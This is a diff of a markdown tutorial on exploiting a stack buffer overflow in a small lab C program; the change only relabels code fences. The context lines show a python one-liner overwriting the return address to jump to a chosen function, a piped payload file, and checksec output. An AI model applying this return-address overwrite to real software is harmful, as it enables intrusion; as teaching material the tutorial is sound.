@@ -73,7 +73,7 @@ I've used gcc 11.1.0 in this example.
 
 This works fine:
 
-```bash
+```shell-session
 $ ./buffer-overflow 
 Enter some text:
 Test
@@ -82,7 +82,7 @@ You entered: Test
 
 A text more than 20 characters crashes the program, as expected:
 
-```bash
+```shell-session
 $ ./buffer-overflow
 Enter some text:
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -118,7 +118,7 @@ We can either do it in edb (CTRL+ALT+S):
 
 or via gdb:
 
-```bash
+```shell-session
 $ gdb -batch -ex "info functions" -ex quit ./buffer-overflow
 All defined functions:
 
@@ -162,7 +162,7 @@ Note: I suppose to work on a little-endian machine. If you work on a big-endian 
 We need to write 32 bytes (any bytes) followed by 0x08049196 into the `buffer` variable, and we should reach our goal:
 (See [here](https://stackoverflow.com/questions/66258454/printing-non-ascii-characters-in-python3) why we can't use print())
 
-```bash
+```shell-session
 $ python -c 'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x96\x91\x04\x08")' | ./buffer-overflow 
 Enter some text:
 You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
@@ -236,7 +236,7 @@ Or at least we need to make sure the RETURN address is written to offset 0x20.
 
 With that payload, the program prints an additional line "XX" and then quits without crashing!
 
-```bash
+```shell-session
 $ cat payload.bin | ./buffer-overflow
 Enter some text:
 You entered: �9����P����P�!�H����XX����
@@ -275,7 +275,7 @@ In the real-world we would need to bypass all of those measures.
 
 To check which measures are enabled, you can use [checksec](https://github.com/slimm609/checksec.sh):
 
-```bash
+```shell-session
 $ checksec --file=./buffer-overflow
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   50) Symbols	  No	0		1		./buffer-overflow
